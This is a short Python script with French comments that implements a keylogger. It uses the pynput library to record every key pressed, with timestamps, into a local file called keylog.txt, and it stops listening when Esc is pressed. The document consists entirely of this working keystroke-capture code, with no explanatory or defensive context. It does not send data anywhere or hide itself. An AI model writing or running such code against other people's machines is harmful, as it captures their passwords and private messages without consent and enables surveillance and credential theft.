from pynput import keyboard
import logging

# Configurer le fichier de log
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info('Key pressed: {0}'.format(key.char))
    except AttributeError:
        logging.info('Special key pressed: {0}'.format(key))

def on_release(key):
    if key == keyboard.Key.esc:
        # Arrêter l'écoute lors de la pression de la touche Échap
        return False

# Configurer l'écouteur de clavier
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
